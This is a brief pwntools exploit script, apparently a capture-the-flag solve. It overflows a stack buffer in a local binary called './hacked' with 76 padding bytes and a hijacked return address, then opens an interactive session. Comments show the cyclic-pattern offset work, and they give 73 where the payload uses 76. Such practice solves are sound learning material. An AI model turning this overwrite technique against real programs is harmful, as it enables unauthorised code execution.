from pwn import *

r = process("./hacked")

# r.sendline('aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa')
payload = b"A" * 76 + p32(0x080491D6)
r.sendline(payload)
r.interactive()

# import pwn; print(pwn.cyclic(100))
# b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'

# python -c "import pwn; print(pwn.cyclic_find(bytes.fromhex('61616174').decode('utf-8'),n=4))"
# 73

# └─$ readelf -h hacked | grep endian
#  Data:                              2's complement, little endian
